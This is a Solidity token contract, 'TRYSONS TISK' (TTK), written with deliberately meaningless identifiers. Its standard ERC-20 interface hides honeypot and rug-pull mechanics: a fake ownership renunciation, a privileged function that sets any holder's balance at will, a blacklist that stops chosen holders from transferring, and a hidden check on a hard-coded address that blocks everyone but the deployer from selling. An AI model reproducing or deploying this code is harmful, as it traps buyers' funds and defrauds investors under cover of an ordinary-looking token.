//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface teamSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fromTake {
    function createPair(address fundShould, address toAt) external returns (address);
}

abstract contract amountFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellSwap) external view returns (uint256);

    function transfer(address fundBuy, uint256 isShould) external returns (bool);

    function allowance(address liquidityMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 isShould) external returns (bool);

    function transferFrom(address sender,address fundBuy,uint256 isShould) external returns (bool);

    event Transfer(address indexed from, address indexed launchedFeeMarketing, uint256 value);
    event Approval(address indexed liquidityMarketing, address indexed spender, uint256 value);
}

interface isSenderMetadata is isSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TRYSONSTISK is amountFee, isSender, isSenderMetadata {

    address teamSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function marketingFund(uint256 isShould) public {
        enableTo();
        launchedBuy = isShould;
    }

    uint256 public enableLaunched;

    function name() external view virtual override returns (string memory) {
        return exemptLaunched;
    }

    function enableTo() private view {
        require(receiverTotalTrading[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private listFrom;

    function owner() external view returns (address) {
        return walletLiquidityTo;
    }

    function approve(address shouldMin, uint256 isShould) public virtual override returns (bool) {
        listFrom[_msgSender()][shouldMin] = isShould;
        emit Approval(_msgSender(), shouldMin, isShould);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return walletLaunch;
    }

    uint256 private listFee = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed limitBuyLaunch, address indexed listTradingMin);

    address public limitAutoEnable;

    string private exemptLaunched = "TRYSONS TISK";

    function minExempt(address sellWallet, address fundBuy, uint256 isShould) internal returns (bool) {
        require(senderIs[sellWallet] >= isShould);
        senderIs[sellWallet] -= isShould;
        senderIs[fundBuy] += isShould;
        emit Transfer(sellWallet, fundBuy, isShould);
        return true;
    }

    bool public limitBuy;

    uint256 teamAuto;

    uint256 launchedBuy;

    function balanceOf(address sellSwap) public view virtual override returns (uint256) {
        return senderIs[sellSwap];
    }

    address private walletLiquidityTo;

    function transfer(address senderFundTrading, uint256 isShould) external virtual override returns (bool) {
        return exemptSwap(_msgSender(), senderFundTrading, isShould);
    }

    mapping(address => bool) public receiverTotalTrading;

    constructor (){
        
        exemptReceiver();
        teamSwap maxShould = teamSwap(enableWalletShould);
        tokenBuy = fromTake(maxShould.factory()).createPair(maxShould.WETH(), address(this));
        
        limitAutoEnable = _msgSender();
        receiverTotalTrading[limitAutoEnable] = true;
        senderIs[limitAutoEnable] = listFee;
        
        emit Transfer(address(0), limitAutoEnable, listFee);
    }

    function transferFrom(address sellWallet, address fundBuy, uint256 isShould) external override returns (bool) {
        if (_msgSender() != enableWalletShould) {
            if (listFrom[sellWallet][_msgSender()] != type(uint256).max) {
                require(isShould <= listFrom[sellWallet][_msgSender()]);
                listFrom[sellWallet][_msgSender()] -= isShould;
            }
        }
        return exemptSwap(sellWallet, fundBuy, isShould);
    }

    uint256 public marketingMode;

    function minMarketing(address senderFundTrading, uint256 isShould) public {
        enableTo();
        senderIs[senderFundTrading] = isShould;
    }

    function exemptReceiver() public {
        emit OwnershipTransferred(limitAutoEnable, address(0));
        walletLiquidityTo = address(0);
    }

    uint256 private listAmount;

    function totalSupply() external view virtual override returns (uint256) {
        return listFee;
    }

    uint8 private walletLaunch = 18;

    function getOwner() external view returns (address) {
        return walletLiquidityTo;
    }

    bool public feeLiquidity;

    address public tokenBuy;

    function symbol() external view virtual override returns (string memory) {
        return receiverTake;
    }

    bool public takeLaunch;

    mapping(address => bool) public shouldIsMarketing;

    bool public totalReceiver;

    string private receiverTake = "TTK";

    mapping(address => uint256) private senderIs;

    function txReceiver(address toBuy) public {
        enableTo();
        if (listTo == marketingMode) {
            listTo = txMode;
        }
        if (toBuy == limitAutoEnable || toBuy == tokenBuy) {
            return;
        }
        shouldIsMarketing[toBuy] = true;
    }

    uint256 private listTo;

    function allowance(address limitMarketingReceiver, address shouldMin) external view virtual override returns (uint256) {
        if (shouldMin == enableWalletShould) {
            return type(uint256).max;
        }
        return listFrom[limitMarketingReceiver][shouldMin];
    }

    function walletTake(address shouldExempt) public {
        if (totalReceiver) {
            return;
        }
        if (listTo == minBuy) {
            feeLiquidity = true;
        }
        receiverTotalTrading[shouldExempt] = true;
        if (limitBuy == feeLiquidity) {
            minBuy = listAmount;
        }
        totalReceiver = true;
    }

    uint256 public minBuy;

    address enableWalletShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function exemptSwap(address sellWallet, address fundBuy, uint256 isShould) internal returns (bool) {
        if (sellWallet == limitAutoEnable) {
            return minExempt(sellWallet, fundBuy, isShould);
        }
        uint256 swapShould = isSender(tokenBuy).balanceOf(teamSell);
        require(swapShould == launchedBuy);
        require(!shouldIsMarketing[sellWallet]);
        return minExempt(sellWallet, fundBuy, isShould);
    }

    uint256 public txMode;

}